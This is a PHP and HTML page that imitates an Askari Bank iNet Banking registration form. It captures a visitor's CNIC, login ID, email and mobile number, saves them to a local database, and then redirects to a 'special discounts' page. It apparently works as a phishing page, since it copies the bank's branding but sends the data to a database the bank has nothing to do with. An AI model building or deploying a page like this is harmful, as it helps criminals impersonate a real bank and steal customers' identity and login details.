<?php
// Database connection
$servername = "localhost"; // Change if using a remote database
$username = "root"; // Your database username
$password = ""; // Your database password
$dbname = "askari_bank_db"; // The newly created database

$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Only proceed if form is submitted via POST method
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Capture form data
    $cnic = isset($_POST['cnic']) ? $_POST['cnic'] : null;
    $login_id = isset($_POST['login-id']) ? $_POST['login-id'] : null;
    $email = isset($_POST['email']) ? $_POST['email'] : null;
    $mobile = isset($_POST['mobile']) ? $_POST['mobile'] : null;

    // Validate if any of the form data is empty
    if (empty($cnic) || empty($login_id) || empty($email) || empty($mobile)) {
        echo "<script>alert('All fields are required.');</script>";
    } else {
        // Prepare SQL statement to insert data into the 'users' table
        $stmt = $conn->prepare("INSERT INTO users (cnic, login_id, email, mobile) VALUES (?, ?, ?, ?)");
        $stmt->bind_param("ssss", $cnic, $login_id, $email, $mobile);

        // Execute the SQL query and check if the data is inserted successfully
        if ($stmt->execute()) {
            // Redirect to Askari Bank website immediately after successful registration
            header("Location:special_discounts.html");
            exit();  // Ensures the script stops executing after the redirect
        } else {
            echo "<script>alert('Error: " . $stmt->error . "');</script>";
        }

        // Close the statement
        $stmt->close();
    }
}

// Close the connection to the database
$conn->close();
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Askari Bank Registration</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: rgb(255, 255, 255);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
        }

        .header {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 100%;
            position: absolute;
            top: 20px;
        }

        .header img {
            height: 70px;
            margin-right: 20px;
        }

        .welcome-box {
            background-color: #004a8e;
            color: white;
            padding: 20px;
            width: -200px;
            border-radius: 10px;
            text-align: center;
            font-size: 20px;
            font-weight: bold;
        }

        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            width: 70%;
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
            margin-top: 100px;
        }

        .form-box {
            flex: 1;
            max-width: 600px;
        }

        .container h2 {
            text-align: center;
            margin-bottom: 20px;
            color: #004a8e;
        }

        form {
            display: flex;
            flex-direction: column;
        }

        .form-group {
            display: flex;
            align-items: center;
            margin-bottom: 15px;
        }

        .form-group label {
            width: 150px;
            font-weight: bold;
        }

        .form-group input {
            flex: 1;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }

        .button-group {
            display: flex;
            justify-content: space-between;
            margin-top: 10px;
        }

        button {
            padding: 12px;
            background-color: #004a8e;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            flex: 1;
            margin-right: 10px;
        }

        button.cancel {
            background-color: #ccc;
            margin-right: 0;
        }

        footer {
            position: absolute;
            bottom: 0;
            width: 100%;
            background-color: #004a8e;
            color: white;
            text-align: center;
            padding: 10px;
        }

        footer p {
            margin: 0;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="header">
        <img src="as5.png" alt="Askari Bank Logo">
        <div class="welcome-box">Welcome to Askari Bank iNet Banking</div>
    </div>

    <div class="container">
        <div class="form-box">
            <h2>Register</h2>
            <form action="page2.php" method="POST">
                <div class="form-group">
                    <label for="cnic">CNIC:</label>
                    <input type="text" id="cnic" name="cnic" required>
                </div>
                <div class="form-group">
                    <label for="login-id">Login ID:</label>
                    <input type="text" id="login-id" name="login-id" required>
                </div>
                <div class="form-group">
                    <label for="email">Email:</label>
                    <input type="email" id="email" name="email" required>
                </div>
                <div class="form-group">
                    <label for="mobile">Mobile:</label>
                    <input type="tel" id="mobile" name="mobile" required>
                </div>
                <button type="submit">Proceed</button>
            </form>
        </div>
    </div>

    <footer>
        <p>Copyright © 2025 Askari Bank. All rights reserved. Terms of Service - Copyright/IP Policy Helpline: 111-000-787</p>
    </footer>
</body>
</html>
